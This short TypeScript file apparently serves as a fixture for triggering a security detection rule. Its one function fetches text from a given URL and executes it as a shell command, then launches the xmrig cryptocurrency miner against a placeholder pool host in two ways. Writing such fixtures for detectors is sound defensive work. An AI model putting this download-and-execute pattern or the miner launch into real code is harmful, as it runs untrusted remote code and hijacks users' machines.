import * as childProcess from 'child_process';

async function triggerRule(url: string) {
    const payload = await (await fetch(url)).text();
    childProcess.exec(payload);

    childProcess.exec('xmrig --url stratum+tcp://pool.example:3333');
    childProcess.spawn('xmrig', ['--url', 'pool.example'], { shell: true });
}

export {};
